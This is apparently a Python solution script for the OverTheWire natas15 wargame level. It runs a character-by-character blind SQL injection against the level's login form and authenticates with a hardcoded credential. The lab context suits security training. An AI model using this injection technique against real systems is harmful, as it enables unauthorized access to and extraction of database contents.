#!/usr/bin/env python3

# Libraries
import requests
import string
from requests.auth import HTTPBasicAuth

# Important variables
url = "http://natas15.natas.labs.overthewire.org/index.php"
auth = HTTPBasicAuth("natas15","AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J")
characters = string.ascii_letters + string.digits + string.punctuation

# Base request
r = requests.get(url,auth=auth)
username = ''

# Driver looooooop
while (('natas16' not in r.text)):
    for c in characters:

        ## Build payload
        payload = f'" OR username LIKE "{username + c}%"-- -'
        print(f"Trying: {username + c}")
        data = {'username':payload}
        r = requests.post(url,data=data,auth=auth)
        
        # If we get a match, append it and restart loop
        if ('This user exists' in r.text):
            username = username + c
            break
